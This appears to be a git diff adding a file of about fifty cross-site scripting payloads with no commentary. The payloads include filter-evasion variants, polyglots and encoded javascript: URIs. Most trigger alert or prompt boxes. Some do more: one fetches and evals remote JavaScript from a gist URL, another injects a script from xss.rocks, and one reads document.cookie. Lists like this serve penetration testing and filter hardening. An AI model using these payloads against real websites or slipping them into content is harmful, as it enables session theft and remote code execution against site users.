@@ -1,0 +1,53 @@
+[]["filter"]["constructor"]("alert(1)")()
+top["al"+"ert"](1);
+<img src="x" onerror="top[`fet`+`ch`]('https://gist.githubusercontent.com/Hubbey/84d413e76dd833b42eb0281b9d7191fa/raw/e08425e18d85b10e82dc6ba4bc25b0df08321000/blog').then(response =>response.text()).then((body) =>{top[`ev`+`al`](body);})">
+%26%23x6a%3b%26%23x61%3b%26%23x76%3b%26%23x61%3b%26%23x73%3b%26%23x63%3b%26%23x72%3b%26%23x69%3b%26%23x70%3b%26%23x74%3b%26%23x3a%3balert(document.cookie)%2f%2fmrsi736h
+<iframe/src="data:text/html,<svg onload=alert(1)>">
+<input type=image src onerror="prompt(1)">
+<svg onload=alert(1)//
+<img src="/" =_=" title="onerror='prompt(1)'">
+<img src='1' onerror='alert(0)' <
+<script x> alert(1) </script 1=2
+<script x>alert('XSS')<script y>
+<svg/onload=location=`javas`+`cript:ale`+`rt%2`+`81%2`+`9`;//
+<svg////////onload=alert(1)>
+<svg id=x;onload=alert(1)>
+<svg id=`x`onload=alert(1)>
+<img src=1 alt=al lang=ert onerror=top[alt+lang](0)>
+<script>$=1,alert($)</script>
+<script ~~~>confirm(1)</script ~~~>
+<script>$=1,\u0061lert($)</script>
+<</script/script><script>eval('\\u'+'0061'+'lert(1)')//</script>
+<</script/script><script ~~~>\u0061lert(1)</script ~~~>
+</style></scRipt><scRipt>alert(1)</scRipt>
+<img src=x:prompt(eval(alt)) onerror=eval(src) alt=String.fromCharCode(88,83,83)>
+<svg><x><script>alert('1'&#41</x>
+<iframe src=""/srcdoc='<svg onload=alert(1)>'>
+<svg><animate onbegin=alert() attributeName=x></svg>
+<img/id="alert('XSS')\"/alt=\"/\"src=\"/\"onerror=eval(id)>
+<img src=1 onerror="s=document.createElement('script');s.src='http://xss.rocks/xss.js';document.body.appendChild(s);"
+javascript:"/*'/*`/*--></noscript></title></textarea></style></template></noembed></script><html \" onmouseover=/*&lt;svg/*/onload=alert()//>
+-->'"/></sCript><deTailS open x=">" ontoggle=(co\u006efirm)``>
+jaVasCript:/*-/*`/*\`/*'/*"/**/(/* */oNcliCk=alert() )//%0D%0A%0D%0A//</stYle/</titLe/</teXtarEa/</scRipt/--!>\x3csVg/<sVg/oNloAd=alert()//>\x3e
+">><marquee><img src=x onerror=confirm(1)></marquee>" ></plaintext\></|\><plaintext/onmouseover=prompt(1) ><script>prompt(1)</script>@gmail.com<isindex formaction=javascript:alert(/XSS/) type=submit>'-->" ></script><script>alert(1)</script>"><img/id="confirm( 1)"/alt="/"src="/"onerror=eval(id&%23x29;>'"><img src="http: //i.imgur.com/P8mL8.jpg">
+" onclick=alert(1)//<button ‘ onclick=alert(1)//> */ alert(1)//
+';alert(String.fromCharCode(88,83,83))//';alert(String. fromCharCode(88,83,83))//";alert(String.fromCharCode (88,83,83))//";alert(String.fromCharCode(88,83,83))//-- ></SCRIPT>">'><SCRIPT>alert(String.fromCharCode(88,83,83)) </SCRIPT>
+javascript://'/</title></style></textarea></script>--><p" onclick=alert()//>*/alert()/*
+javascript://--></script></title></style>"/</textarea>*/<alert()/*' onclick=alert()//>a
+javascript://</title>"/</script></style></textarea/-->*/<alert()/*' onclick=alert()//>/
+javascript://</title></style></textarea>--></script><a"//' onclick=alert()//>*/alert()/*
+javascript://'//" --></textarea></style></script></title><b onclick= alert()//>*/alert()/*
+javascript://</title></textarea></style></script --><li '//" '*/alert()/*', onclick=alert()//
+javascript:alert()//--></script></textarea></style></title><a"//' onclick=alert()//>*/alert()/*
+--></script></title></style>"/</textarea><a' onclick=alert()//>*/alert()/*
+/</title/'/</style/</script/</textarea/--><p" onclick=alert()//>*/alert()/*
+javascript://--></title></style></textarea></script><svg "//' onclick=alert()//
+/</title/'/</style/</script/--><p" onclick=alert()//>*/alert()/*
+-->'"/></sCript><svG x=">" onload=(co\u006efirm)``>
+<svg%0Ao%00nload=%09((pro\u006dpt))()//
+javascript:"/*'/*`/*\" /*</title></style></textarea></noscript></noembed></template></script/--><svg/onload=/*<html/*/onmouseover=alert()//>
+javascript:"/*\"/*`/*' /*</template></textarea></noembed></noscript></title></style></script>--><svg onload=/*<html/*/onmouseover=alert()//>
+javascript:`//"//\"//</title></textarea></style></noscript></noembed></script></template><svg/onload='/*--><html */ onmouseover=alert()//'>`
+%0ajavascript:`/*\"/*-->&lt;svg onload='/*</template></noembed></noscript></style></title></textarea></script><html onmouseover="/**/ alert(test)//'">`
+javascript:/*--></title></style></textarea></script></xmp><svg/onload='+/"/+/onmouseover=1/+/[*/[]/+document.location=`//localhost/mH`//'>
+javascript:"/*'/*`/*--></noscript></title></textarea></style></template></noembed></script><html \" onmouseover=/*&lt;svg/*/onload=document.location=`//localhost/mH`//>
